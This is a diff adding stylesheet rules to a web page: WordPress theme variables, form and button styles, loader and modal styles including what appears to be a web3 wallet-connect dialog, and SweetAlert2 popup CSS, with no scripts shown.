+        [data-header*="type-1"] [data-id="trigger"] {
+            --icon-size: 18px;
+        }
+
+        [data-header*="type-1"] [data-id="trigger"] .ct-label {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-header*="type-1"] {
+            --header-height: 129px;
+        }
+
+        [data-footer*="type-1"] [data-id="copyright"] {
+            --fontWeight: 400;
+            --fontSize: 15px;
+            --lineHeight: 1.3;
+            --color: #000000;
+        }
+
+        [data-footer*="type-1"] [data-column="copyright"] {
+            --horizontal-alignment: center;
+            --vertical-alignment: flex-start;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="middle"]>div {
+            --container-spacing: 70px;
+            --border: none;
+            --border-top: none;
+            --border-bottom: none;
+            --grid-template-columns: repeat(3, 1fr);
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="middle"] .widget-title {
+            --fontSize: 16px;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="middle"] {
+            --border-top: none;
+            --border-bottom: none;
+            background-color: #ffffff;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="top"]>div {
+            --container-spacing: 30px;
+            --border: none;
+            --border-top: none;
+            --border-bottom: none;
+            --grid-template-columns: repeat(2, 1fr);
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="top"] .widget-title {
+            --fontSize: 16px;
+            --heading-color: #CFCFCF;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-row*="top"] {
+            --border-top: none;
+            --border-bottom: none;
+            background-color: #ffffff;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-column="widget-area-1"] {
+            --margin: 0px !important;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-column="widget-area-1"] .ct-widget {
+            --color: #000000;
+        }
+
+        [data-footer*="type-1"] .ct-footer [data-column="widget-area-2"] .ct-widget {
+            --color: #000000;
+        }
+
+        [data-footer*="type-1"][data-footer*="reveal"] .site-main {
+            --footer-box-shadow: 0px 30px 50px rgba(0, 0, 0, 0.1);
+        }
+
+        [data-footer*="type-1"] footer.ct-footer {
+            background-color: var(--paletteColor6);
+        }
+
+        :root {
+            --fontFamily: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
+            --fontWeight: 400;
+            --textTransform: none;
+            --textDecoration: none;
+            --fontSize: 16px;
+            --lineHeight: 1.65;
+            --letterSpacing: 0em;
+            --buttonFontWeight: 500;
+            --buttonFontSize: 15px;
+            --has-classic-forms: var(--true);
+            --has-modern-forms: var(--false);
+            --form-field-border-initial-color: var(--border-color);
+            --form-field-border-focus-color: var(--paletteColor1);
+            --form-selection-control-initial-color: var(--border-color);
+            --form-selection-control-accent-color: var(--paletteColor1);
+            --paletteColor1: #282cff;
+            --paletteColor2: #ff4d00;
+            --paletteColor3: #fefeff;
+            --paletteColor4: #ffffff;
+            --paletteColor5: #e1e8ed;
+            --paletteColor6: #f2f5f7;
+            --paletteColor7: #FAFBFC;
+            --paletteColor8: #ffffff;
+            --color: #202020;
+            --linkInitialColor: var(--paletteColor1);
+            --linkHoverColor: var(--paletteColor2);
+            --selectionTextColor: #ffffff;
+            --selectionBackgroundColor: var(--paletteColor1);
+            --border-color: var(--paletteColor5);
+            --headings-color: #ffffff;
+            --content-spacing: 1.5em;
+            --buttonMinHeight: 40px;
+            --buttonShadow: none;
+            --buttonTransform: none;
+            --buttonTextInitialColor: #ffffff;
+            --buttonTextHoverColor: #ffffff;
+            --buttonInitialColor: #e87dfe;
+            --buttonHoverColor: var(--paletteColor2);
+            --button-border: none;
+            --buttonBorderRadius: 3px;
+            --button-padding: 5px 20px;
+            --normal-container-max-width: 1290px;
+            --content-vertical-spacing: 60px;
+            --narrow-container-max-width: 750px;
+            --wide-offset: 130px;
+        }
+
+        h1 {
+            --fontWeight: 700;
+            --fontSize: 40px;
+            --lineHeight: 1.5;
+        }
+
+        h2 {
+            --fontWeight: 700;
+            --fontSize: 35px;
+            --lineHeight: 1.5;
+        }
+
+        h3 {
+            --fontWeight: 700;
+            --fontSize: 30px;
+            --lineHeight: 1.5;
+        }
+
+        h4 {
+            --fontWeight: 700;
+            --fontSize: 25px;
+            --lineHeight: 1.5;
+        }
+
+        h5 {
+            --fontWeight: 700;
+            --fontSize: 20px;
+            --lineHeight: 1.5;
+        }
+
+        h6 {
+            --fontWeight: 700;
+            --fontSize: 16px;
+            --lineHeight: 1.5;
+        }
+
+        .wp-block-quote.is-style-large p,
+        .wp-block-pullquote p,
+        .ct-quote-widget blockquote {
+            --fontFamily: Georgia;
+            --fontWeight: 600;
+            --fontSize: 25px;
+        }
+
+        code,
+        kbd,
+        samp,
+        pre {
+            --fontFamily: monospace;
+            --fontWeight: 400;
+            --fontSize: 16px;
+        }
+
+        .ct-sidebar .widget-title {
+            --fontSize: 18px;
+        }
+
+        .ct-breadcrumbs {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        body {
+            background-color: var(--paletteColor7);
+        }
+
+        [data-prefix="single_blog_post"] .entry-header .page-title {
+            --fontSize: 30px;
+        }
+
+        [data-prefix="single_blog_post"] .entry-header .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="categories"] .entry-header .page-title {
+            --fontSize: 30px;
+        }
+
+        [data-prefix="categories"] .entry-header .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="search"] .entry-header .page-title {
+            --fontSize: 30px;
+        }
+
+        [data-prefix="search"] .entry-header .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="author"] .entry-header .page-title {
+            --fontSize: 30px;
+        }
+
+        [data-prefix="author"] .entry-header .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="author"] .hero-section[data-type="type-2"] {
+            background-color: var(--paletteColor6);
+            background-image: none;
+            --container-padding: 50px 0;
+        }
+
+        [data-prefix="single_page"] .entry-header .page-title {
+            --fontSize: 30px;
+        }
+
+        [data-prefix="single_page"] .entry-header .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="blog"] .entries {
+            --grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        [data-prefix="blog"] .entry-card .entry-title {
+            --fontSize: 20px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="blog"] .entry-card .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-prefix="blog"] .entry-card {
+            background-color: var(--paletteColor8);
+            --box-shadow: 0px 12px 18px -6px rgba(34, 56, 101, 0.04);
+        }
+
+        [data-prefix="categories"] .entries {
+            --grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        [data-prefix="categories"] .entry-card .entry-title {
+            --fontSize: 20px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="categories"] .entry-card .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-prefix="categories"] .entry-card {
+            background-color: var(--paletteColor8);
+            --box-shadow: 0px 12px 18px -6px rgba(34, 56, 101, 0.04);
+        }
+
+        [data-prefix="author"] .entries {
+            --grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        [data-prefix="author"] .entry-card .entry-title {
+            --fontSize: 20px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="author"] .entry-card .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-prefix="author"] .entry-card {
+            background-color: var(--paletteColor8);
+            --box-shadow: 0px 12px 18px -6px rgba(34, 56, 101, 0.04);
+        }
+
+        [data-prefix="search"] .entries {
+            --grid-template-columns: repeat(3, minmax(0, 1fr));
+        }
+
+        [data-prefix="search"] .entry-card .entry-title {
+            --fontSize: 20px;
+            --lineHeight: 1.3;
+        }
+
+        [data-prefix="search"] .entry-card .entry-meta {
+            --fontWeight: 600;
+            --textTransform: uppercase;
+            --fontSize: 12px;
+        }
+
+        [data-prefix="search"] .entry-card {
+            background-color: var(--paletteColor8);
+            --box-shadow: 0px 12px 18px -6px rgba(34, 56, 101, 0.04);
+        }
+
+        form textarea {
+            --form-field-height: 170px;
+        }
+
+        .ct-sidebar {
+            --linkInitialColor: var(--color);
+            --linkHoverColor: #ff0cba;
+        }
+
+        .ct-back-to-top {
+            --icon-color: #ffffff;
+            --icon-hover-color: #ffffff;
+            --top-button-background-color: #e87dfe;
+            --top-button-background-hover-color: rgba(33, 33, 33, 0.81);
+            --border-radius: 2px;
+        }
+
+        [data-prefix="single_blog_post"] [class*="ct-container"]>article[class*="post"] {
+            --has-boxed: var(--false);
+            --has-wide: var(--true);
+        }
+
+        [data-prefix="single_page"] [class*="ct-container"]>article[class*="post"] {
+            --has-boxed: var(--false);
+            --has-wide: var(--true);
+        }
+
+        @media (max-width: 999.98px) {
+            [data-header*="type-1"] .ct-header [data-row*="middle"] {
+                --height: 70px;
+            }
+
+            [data-header*="type-1"] #offcanvas {
+                --side-panel-width: 65vw;
+            }
+
+            [data-header*="type-1"] {
+                --header-height: 70px;
+            }
+
+            [data-footer*="type-1"] .ct-footer [data-row*="middle"]>div {
+                --container-spacing: 50px;
+                --grid-template-columns: initial;
+            }
+
+            [data-footer*="type-1"] .ct-footer [data-row*="top"]>div {
+                --grid-template-columns: initial;
+            }
+
+            [data-prefix="blog"] .entries {
+                --grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+
+            [data-prefix="categories"] .entries {
+                --grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+
+            [data-prefix="author"] .entries {
+                --grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+
+            [data-prefix="search"] .entries {
+                --grid-template-columns: repeat(2, minmax(0, 1fr));
+            }
+        }
+
+        @media (max-width: 689.98px) {
+            [data-header*="type-1"] #offcanvas {
+                --side-panel-width: 90vw;
+            }
+
+            [data-footer*="type-1"] .ct-footer [data-row*="middle"]>div {
+                --container-spacing: 40px;
+                --grid-template-columns: initial;
+            }
+
+            [data-footer*="type-1"] .ct-footer [data-row*="top"]>div {
+                --grid-template-columns: initial;
+            }
+
+            [data-prefix="blog"] .entries {
+                --grid-template-columns: repeat(1, minmax(0, 1fr));
+            }
+
+            [data-prefix="blog"] .entry-card .entry-title {
+                --fontSize: 18px;
+            }
+
+            [data-prefix="categories"] .entries {
+                --grid-template-columns: repeat(1, minmax(0, 1fr));
+            }
+
+            [data-prefix="categories"] .entry-card .entry-title {
+                --fontSize: 18px;
+            }
+
+            [data-prefix="author"] .entries {
+                --grid-template-columns: repeat(1, minmax(0, 1fr));
+            }
+
+            [data-prefix="author"] .entry-card .entry-title {
+                --fontSize: 18px;
+            }
+
+            [data-prefix="search"] .entries {
+                --grid-template-columns: repeat(1, minmax(0, 1fr));
+            }
+
+            [data-prefix="search"] .entry-card .entry-title {
+                --fontSize: 18px;
+            }
+
+            :root {
+                --content-vertical-spacing: 50px;
+            }
+        }
+    </style>
+    <link rel="icon" href="/files/favicon.ico" sizes="32x32">
+    <link rel="icon" href="/files/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" href="/files/favicon.ico">
+    <meta name="msapplication-TileImage" content="/files/favicon.ico">
+    <style id="wp-custom-css">
+        /** WPFORMS Input Textarea **/
+        .wpforms-form input,
+        .wpforms-form textarea {
+            background-color: rgba(0, 0, 0, 0.8) !important;
+            color: white !important;
+        }
+
+        /** WPFORMS SUBMIT BUTTON **/
+        button.wpforms-submit {
+            color: #FFFFFF !important;
+            background-color: #202020 !important;
+        }
+
+        .wpforms-field-label {
+            color: #202020 !important;
+        }
+
+        .button33 {
+            display: inline-block;
+            border-radius: 4px;
+            background-color: #f4511e;
+            border: none;
+            color: #FFFFFF;
+            text-align: center;
+            font-size: 15px;
+            padding: 11px;
+            padding-top: 10px;
+            width: 188px;
+            transition: all 0.5s;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        .button33 span {
+            cursor: pointer;
+            display: inline-block;
+            position: relative;
+            transition: 0.5s;
+            padding-top: 10px;
+        }
+
+        .button33 span:after {
+            content: '\00bb';
+            position: absolute;
+            opacity: 0;
+            top: 0;
+            right: -20px;
+            transition: 0.5s;
+            padding-top: 10px;
+        }
+
+        .button33:hover span {
+            padding-right: 25px;
+        }
+
+        .button33:hover span:after {
+            opacity: 1;
+            right: 0;
+        }
+
+        body {
+            background: black;
+            color: white;
+        }
+
+        .main {
+            text-align: center;
+            width: 100%;
+            vertical-align: middle;
+            position: absolute;
+            top: 50%;
+        }
+
+        #backdrop {
+            display: none;
+            position: absolute;
+            z-index: 0;
+            opacity: 0.6;
+            background: black;
+            width: 100%;
+            height: 100%;
+            top: 0;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .loaderMain {
+                padding: 10px !important;
+                position: absolute !important;
+                z-index: 999 !important;
+                background: rgba(0, 0, 0, 1) !important;
+                border-radius: 20px !important;
+                display: block !important;
+                top: 0% !important;
+                right: 0% !important;
+                width: 100% !important;
+                transform: inherit !important;
+                transform: translateY(50%) !important;
+                height: auto !important;
+                margin: auto !important;
+                font-size: 50px !important;
+                text-shadow: 10px 10px black !important;
+                text-align: center !important;
+            }
+        }
+
+        .loader {
+            filter: blur(1px);
+            position: absolute;
+            top: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999;
+            background-color: rgb(0, 0, 0, 0.2);
+            backdrop-filter: blur(5px);
+            display: none;
+        }
+
+        .closeLoader {
+            background: white;
+            border-radius: 20px;
+            color: black;
+            text-align: center;
+            position: relative;
+            bottom: 0;
+            display: block;
+            width: 90%;
+            margin: auto;
+            margin-top: 30px;
+            font-size: 30px;
+            padding: 20px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .loaderMain svg circle {
+            stroke: white;
+            stroke-width: 5px;
+        }
+
+        .loaderMain {
+            padding: 20px;
+            position: absolute;
+            z-index: 999;
+            background: rgba(0, 0, 0, 1);
+            border-radius: 20px;
+            display: block;
+            top: 50%;
+            right: 50%;
+            max-width: 500px;
+            transform: translate(50%, -50%);
+            font-size: 50px;
+            text-shadow: 10px 10px black;
+            text-align: center;
+            align-content
+        }
+
+        .loaderMain h1 {
+            margin-bottom: 40px;
+        }
+
+        .loaderMain p {
+            font-size: 30px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .lds-ring {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 64px;
+            height: 64px;
+            margin: 8px;
+            border: 8px solid #FF65FB;
+            border-radius: 50%;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #FF65FB transparent transparent transparent;
+        }
+
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s;
+        }
+
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s;
+        }
+
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s;
+        }
+
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .blink_me {
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% {
+                opacity: 0;
+            }
+        }
+
+        #loadingModal {
+            display: none;
+            position: absolute;
+            background: black;
+            color: #FF65FB;
+            vertical-align: middle;
+            font-size: 50px;
+            z-index: 1;
+            font-weight: bold;
+            top: 50%;
+            right: 50%;
+            transform: translate(50%, -50%);
+            filter: blur(1.3px);
+            border: 5px solid white;
+        }
+
+        #content {
+            padding: 20px 100px 20px 100px;
+            font-family: Arial, helvetica, sans-serif;
+        }
+
+        .main h1 {
+            font-size: 60px;
+            filter: blur(2px);
+            color: white;
+            position: relative;
+            top: 5px;
+            text-shadow: 5px 10px white;
+        }
+
+        .connect {
+            padding: 10px 20px 10px 20px;
+            background: black;
+            filter: blur(0.5px);
+            color: white;
+            border: 2px dashed white;
+            font-size: 40px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .closeConnection {
+            cursor: pointer;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #2e3840;
+            padding: 10px;
+            text-align: center;
+            border-radius: 10px;
+            color: white;
+        }
+
+        .connect:hover {
+            cursor: pointer;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        #WEB3_CONNECT_MODAL_ID {
+            display: none;
+        }
+
+        .header {
+            display: block;
+            background: white;
+            border-radius: 20px;
+            margin: 20px;
+            padding: 10px 5px 10px 5px;
+            color: black;
+            text-align: center;
+            font-family: Arial, helvetica, sans-serif;
+            font-weight: bold;
+            font-size: 15px;
+            text-transform: uppercase;
+            filter: blur(0.7px)
+        }
+
+        /*! CSS Used from: Embedded */
+        .fqonLZ {
+            width: 45px;
+            height: 45px;
+            display: flex;
+            border-radius: 50%;
+            overflow: visible;
+            box-shadow: none;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .fqonLZ img {
+            width: 100%;
+            height: 100%;
+        }
+
+        @media screen and (max-width: 768px) {
+            .fqonLZ {
+                width: 8.5vw;
+                height: 8.5vw;
+            }
+        }
+
+        .iKzkWq {
+            width: 100%;
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 0.5em;
+            color: rgb(199, 199, 199);
+        }
+
+        @media screen and (max-width: 768px) {
+            .iKzkWq {
+                font-size: 5vw;
+            }
+        }
+
+        .kFITWz {
+            width: 100%;
+            font-size: 18px;
+            margin: 0.333em 0px;
+            color: rgb(136, 136, 136);
+        }
+
+        @media screen and (max-width: 768px) {
+            .kFITWz {
+                font-size: 4vw;
+            }
+        }
+
+        .iWCqoQ {
+            transition: background-color 0.2s ease-in-out 0s;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            background-color: rgb(39, 49, 56);
+            border-radius: 12px;
+            padding: 24px 16px;
+        }
+
+        @media screen and (max-width: 768px) {
+            .iWCqoQ {
+                padding: 1vw;
+            }
+        }
+
+        .cSaJae {
+            width: 100%;
+            padding: 8px;
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            flex-direction: column;
+            cursor: pointer;
+            border-radius: 0px;
+            border: 1px solid rgba(195, 195, 195, 0.14);
+        }
+
+        @media (hover: hover) {
+            .cSaJae:hover .sc-hKwDye {
+                background-color: rgb(16, 26, 32);
+            }
+        }
+
+        .uYscM {
+            transition: opacity 0.1s ease-in-out 0s;
+            text-align: center;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            margin-left: -50vw;
+            top: 0px;
+            left: 50%;
+            z-index: 2;
+            will-change: opacity;
+            background-color: rgba(0, 0, 0, 0.4);
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+            display: flex;
+            -webkit-box-pack: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+        }
+
+        .uYscM * {
+            box-sizing: border-box !important;
+        }
+
+        .fmSSut {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            padding: 15px;
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            justify-content: center;
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+        }
+
+        .fFpYRP {
+            position: absolute;
+            inset: 0px;
+        }
+
+        .hSsAsP {
+            position: relative;
+            width: 100%;
+            background-color: rgb(39, 49, 56);
+            border-radius: 12px;
+            margin: 10px;
+            padding: 0px;
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            max-width: 500px;
+            min-width: fit-content;
+            max-height: 100%;
+            overflow: auto;
+        }
+
+        @media screen and (max-width: 768px) {
+            .hSsAsP {
+                max-width: 500px;
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <style>
+        .swal2-popup.swal2-toast {
+            box-sizing: border-box;
+            grid-column: 1/4 !important;
+            grid-row: 1/4 !important;
+            grid-template-columns: min-content auto min-content;
+            padding: 1em;
+            overflow-y: hidden;
+            background: #fff;
+            box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
+            pointer-events: all
+        }
+
+        .swal2-popup.swal2-toast>* {
+            grid-column: 2
+        }
+
+        .swal2-popup.swal2-toast .swal2-title {
+            margin: .5em 1em;
+            padding: 0;
+            font-size: 1em;
+            text-align: initial
+        }
+
+        .swal2-popup.swal2-toast .swal2-loading {
+            justify-content: center
+        }
+
+        .swal2-popup.swal2-toast .swal2-input {
+            height: 2em;
+            margin: .5em;
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-validation-message {
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-footer {
+            margin: .5em 0 0;
+            padding: .5em 0 0;
+            font-size: .8em
+        }
+
+        .swal2-popup.swal2-toast .swal2-close {
+            grid-column: 3/3;
+            grid-row: 1/99;
+            align-self: center;
+            width: .8em;
+            height: .8em;
+            margin: 0;
+            font-size: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-html-container {
+            margin: .5em 1em;
+            padding: 0;
+            overflow: initial;
+            font-size: 1em;
+            text-align: initial
+        }
+
+        .swal2-popup.swal2-toast .swal2-html-container:empty {
+            padding: 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-loader {
+            grid-column: 1;
+            grid-row: 1/99;
+            align-self: center;
+            width: 2em;
+            height: 2em;
+            margin: .25em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon {
+            grid-column: 1;
+            grid-row: 1/99;
+            align-self: center;
+            width: 2em;
+            min-width: 2em;
+            height: 2em;
+            margin: 0 .5em 0 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
+            display: flex;
+            align-items: center;
+            font-size: 1.8em;
+            font-weight: bold
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+            width: 2em;
+            height: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
+            top: .875em;
+            width: 1.375em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
+            left: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
+            right: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-actions {
+            justify-content: flex-start;
+            height: auto;
+            margin: 0;
+            margin-top: .5em;
+            padding: 0 .5em
+        }
+
+        .swal2-popup.swal2-toast .swal2-styled {
+            margin: .25em .5em;
+            padding: .4em .6em;
+            font-size: 1em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success {
+            border-color: #a5dc86
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
+            position: absolute;
+            width: 1.6em;
+            height: 3em;
+            transform: rotate(45deg);
+            border-radius: 50%
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
+            top: -0.8em;
+            left: -0.5em;
+            transform: rotate(-45deg);
+            transform-origin: 2em 2em;
+            border-radius: 4em 0 0 4em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
+            top: -0.25em;
+            left: .9375em;
+            transform-origin: 0 1.5em;
+            border-radius: 0 4em 4em 0
+        }
+
+        .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+            width: 2em;
+            height: 2em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+            top: 0;
+            left: .4375em;
+            width: .4375em;
+            height: 2.6875em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
+            height: .3125em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
+            top: 1.125em;
+            left: .1875em;
+            width: .75em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
+            top: .9375em;
+            right: .1875em;
+            width: 1.375em
+        }
+
+        .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
+            animation: swal2-toast-animate-success-line-tip .75s
+        }
+
+        .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
+            animation: swal2-toast-animate-success-line-long .75s
+        }
+
+        .swal2-popup.swal2-toast.swal2-show {
+            animation: swal2-toast-show .5s
+        }
+
+        .swal2-popup.swal2-toast.swal2-hide {
+            animation: swal2-toast-hide .1s forwards
+        }
+
+        .swal2-container {
+            display: grid;
+            position: fixed;
+            z-index: 1060;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            box-sizing: border-box;
+            grid-template-areas: "top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";
+            grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
+            height: 100%;
+            padding: .625em;
+            overflow-x: hidden;
+            transition: background-color .1s;
+            -webkit-overflow-scrolling: touch
+        }
+
+        .swal2-container.swal2-backdrop-show,
+        .swal2-container.swal2-noanimation {
+            background: rgba(0, 0, 0, .4)
+        }
+
+        .swal2-container.swal2-backdrop-hide {
+            background: rgba(0, 0, 0, 0) !important
+        }
+
+        .swal2-container.swal2-top-start,
+        .swal2-container.swal2-center-start,
+        .swal2-container.swal2-bottom-start {
+            grid-template-columns: minmax(0, 1fr) auto auto
+        }
+
+        .swal2-container.swal2-top,
+        .swal2-container.swal2-center,
+        .swal2-container.swal2-bottom {
+            grid-template-columns: auto minmax(0, 1fr) auto
+        }
+
+        .swal2-container.swal2-top-end,
+        .swal2-container.swal2-center-end,
+        .swal2-container.swal2-bottom-end {
+            grid-template-columns: auto auto minmax(0, 1fr)
+        }
+
+        .swal2-container.swal2-top-start>.swal2-popup {
+            align-self: start
+        }
+
+        .swal2-container.swal2-top>.swal2-popup {
+            grid-column: 2;
+            align-self: start;
+            justify-self: center
+        }
+
+        .swal2-container.swal2-top-end>.swal2-popup,
+        .swal2-container.swal2-top-right>.swal2-popup {
+            grid-column: 3;
+            align-self: start;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-center-start>.swal2-popup,
+        .swal2-container.swal2-center-left>.swal2-popup {
+            grid-row: 2;
+            align-self: center
+        }
+
+        .swal2-container.swal2-center>.swal2-popup {
+            grid-column: 2;
+            grid-row: 2;
+            align-self: center;
+            justify-self: center
+        }
+
+        .swal2-container.swal2-center-end>.swal2-popup,
+        .swal2-container.swal2-center-right>.swal2-popup {
+            grid-column: 3;
+            grid-row: 2;
+            align-self: center;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-bottom-start>.swal2-popup,
+        .swal2-container.swal2-bottom-left>.swal2-popup {
+            grid-column: 1;
+            grid-row: 3;
+            align-self: end
+        }
+
+        .swal2-container.swal2-bottom>.swal2-popup {
+            grid-column: 2;
+            grid-row: 3;
+            justify-self: center;
+            align-self: end
+        }
+
+        .swal2-container.swal2-bottom-end>.swal2-popup,
+        .swal2-container.swal2-bottom-right>.swal2-popup {
+            grid-column: 3;
+            grid-row: 3;
+            align-self: end;
+            justify-self: end
+        }
+
+        .swal2-container.swal2-grow-row>.swal2-popup,
+        .swal2-container.swal2-grow-fullscreen>.swal2-popup {
+            grid-column: 1/4;
+            width: 100%
+        }
+
+        .swal2-container.swal2-grow-column>.swal2-popup,
+        .swal2-container.swal2-grow-fullscreen>.swal2-popup {
+            grid-row: 1/4;
+            align-self: stretch
+        }
+
+        .swal2-container.swal2-no-transition {
+            transition: none !important
+        }
+
+        .swal2-popup {
+            display: none;
+            position: relative;
+            box-sizing: border-box;
+            grid-template-columns: minmax(0, 100%);
+            width: 32em;
+            max-width: 100%;
+            padding: 0 0 1.25em;
+            border: none;
+            border-radius: 5px;
+            background: #fff;
+            color: #545454;
+            font-family: inherit;
+            font-size: 1rem
+        }
+
+        .swal2-popup:focus {
+            outline: none
+        }
+
+        .swal2-popup.swal2-loading {
+            overflow-y: hidden
+        }
+
+        .swal2-title {
+            position: relative;
+            max-width: 100%;
+            margin: 0;
+            padding: .8em 1em 0;
+            color: inherit;
+            font-size: 1.875em;
+            font-weight: 600;
+            text-align: center;
+            text-transform: none;
+            word-wrap: break-word
+        }
+
+        .swal2-actions {
+            display: flex;
+            z-index: 1;
+            box-sizing: border-box;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            width: auto;
+            margin: 1.25em auto 0;
+            padding: 0
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
+            opacity: .4
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
+        }
+
+        .swal2-actions:not(.swal2-loading) .swal2-styled:active {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
+        }
+
